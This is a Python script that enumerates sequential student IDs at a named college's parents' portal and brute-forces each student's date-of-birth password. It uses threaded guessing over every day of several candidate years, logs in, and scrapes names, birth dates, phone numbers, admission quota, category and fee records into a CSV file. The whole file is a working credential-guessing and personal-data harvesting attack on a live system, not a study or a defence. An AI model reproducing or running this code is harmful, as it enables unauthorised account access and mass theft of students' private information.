import os
import pickle
import time
from typing import Union
from threading import Thread

from scraper import Scraper, cached


class SisScraper(Scraper):
    @staticmethod
    def gen_payload() -> dict[str, str]:
        return {
            "username": "",
            "dd": "",
            "mm": "",
            "yyyy": "",
            "passwd": "",
            "remember": "",
            "option": "com_user",
            "task": "login",
            "return": "",
            "ea07d18ec2752bcca07e20a852d96337": "1"
        }

    @staticmethod
    def gen_usn(year: str, dept: str, i: int, head="1MS") -> str:
        return f"{head}{year}{dept}{i:03}"

    @staticmethod
    def get_cache():
        try:
            with open('cache1er2344.bin', 'rb') as file:
                return pickle.load(file)
        except FileNotFoundError:
            return {}

    def save_cache(self):
        with open('cache1er2344.bin', 'wb') as file:
            pickle.dump(self.get_dob.cache, file)

    def __init__(self, URL="https://parents.msrit.edu/"):
        self.URL = URL
        super(SisScraper, self).__init__()

    def get_stats(self, payload) -> dict[str, str]:
        soup = self.get_soap(self.URL, "POST", payload)
        body = soup.body
        if body.find(id="username"): return {}
        td = body.find_all("td")
        trs = body.find_all("tbody")[1].find_all("tr")
        return {
            "name": body.find_all("h3")[0].text,
            "usn": payload["username"],
            "dob": payload["passwd"],
            "class": body.find_all("p")[6].text.strip(),
            "quota": td[4].text[7:],
            "mob": td[5].text[8:],
            "cat": td[8].text[18:],
            "paid": [tr.find_all("td")[3].text for tr in trs]
        }

    def get_post_body(self, payload):
        soup = self.get_soap(self.URL, "POST", payload)
        body = soup.body
        if not body.find(id="username"): return body

    @cached(get_cache())
    def get_dob(self, usn) -> Union[str, None]:
        join_year = int("20" + usn[3:5])
        for year in [y := join_year - 18, y - 1, y + 1]:
            if dob := self.brute_year(usn, year): return dob

    def brute_year(self, usn: str, year: int) -> Union[str, None]:
        workers = []
        t = time.time()
        dob = [None]
        for i in range(1, 13):
            worker = Thread(target=self.brute_month, args=(usn, year, i, dob))
            workers.append(worker)
            worker.start()
        for worker in workers:
            worker.join()
        print("[Log] Time:", time.time() - t, "sec")
        return dob.pop()

    def brute_month(self, usn: str, year: int, month: int, dob_thread: list = None) -> Union[str, None]:
        payload = self.gen_payload()
        assert (dob_list := isinstance(dob_thread, list)) or dob_thread is None, \
            "dob_thread must be a list, used for threading"
        if dob_list:
            assert len(dob_thread) == 1, \
                "dob_thread must have a single element, used for default value"
        for i in range(1, 32):
            if dob_list and len(dob_thread) > 1: return
            payload['username'] = usn.lower()
            payload['passwd'] = f"{year}-{month:02}-{i:02}"
            if self.get_post_body(payload):
                if dob_list: dob_thread.append(payload['passwd'])
                return payload['passwd']

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.save_cache()
        super(SisScraper, self).__exit__(exc_type, exc_val, exc_tb)


if __name__ == '__main__':
    HEAD = "1MS"
    YEAR = "21"
    DEPT = "IS"
    TOLERATE = 5
    if not os.path.exists(f"sis"): os.mkdir(f"sis")
    with SisScraper() as SIS, open(f"sis/sis_{YEAR}_{DEPT}.csv", "w+") as f:
        tol = TOLERATE
        _i = 1
        f.write(_write := f"{'usn':{len(HEAD) + len(YEAR) + len(DEPT) + 3}},{'name':64},{'dob':10}\n")
        print(_write)
        while tol > 0:
            pl = SIS.gen_payload()
            pl['username'] = SIS.gen_usn(YEAR, DEPT, _i, HEAD)
            pl['passwd'] = SIS.get_dob(pl['username'])
            st = SIS.get_stats(pl)
            _i += 1
            if not st:
                tol -= 1
                continue
            tol = TOLERATE
            f.write(
                _write := f"{pl['username']:{len(HEAD) + len(YEAR) + len(DEPT) + 3}},{st['name']:64},{pl['passwd']:10}\n"
            )
            SIS.save_cache()
            f.flush()
            print(_write)
